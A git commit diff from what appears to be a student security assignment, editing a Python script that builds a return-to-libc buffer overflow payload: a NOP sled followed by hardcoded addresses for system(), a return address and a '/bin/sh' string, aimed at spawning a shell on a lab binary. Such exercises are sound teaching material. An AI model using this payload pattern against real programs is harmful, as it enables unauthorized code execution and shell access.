79cdda66a9d0ba067e1d254b4c233f1f1411e03c
CodeMaestro1 <constantinospis@gmail.com>
2025-01-16 22:51:33 +0200

    Assign_8 finished README file will be updated soon

--- Assign_8/Buffer_Attack_Secure.py
+++ Assign_8/Buffer_Attack_Secure.py
@@ -1,12 +1,10 @@
-nopsled = b"A" * 44 #FIll in the buffer with NOPs until we reach the return address
+nopsled = b"\x90" * 44 #FIll in the buffer with NOPs until we reach the return address
 
-address_of_system = b"\x30\x24\xdc\xf7" # In big endian we would have: 0xf7dc2430
+address_of_system = b"\x30\x24\xdc\xf7" # In big endian we would have: 0x f7 dc 24 30
 
-#return_address_of_system = b"\xe8\x6d\xf3\xf7" #0xf7f36de8
-return_address_of_system = b"\xd0\x0b\xdb\xf7"
+return_address_of_system = b"\xd0\x0b\xdb\xf7" #0x f7 db 0b d0
 
-
-address_of_bin_sh = b"\x52\xd0\xff\xff" #0xffffd052
+address_of_bin_sh = b"\xe8\x6d\xf3\xf7" #0x f7 f3 6d e8
 
 payload = nopsled + address_of_system + return_address_of_system + address_of_bin_sh
 
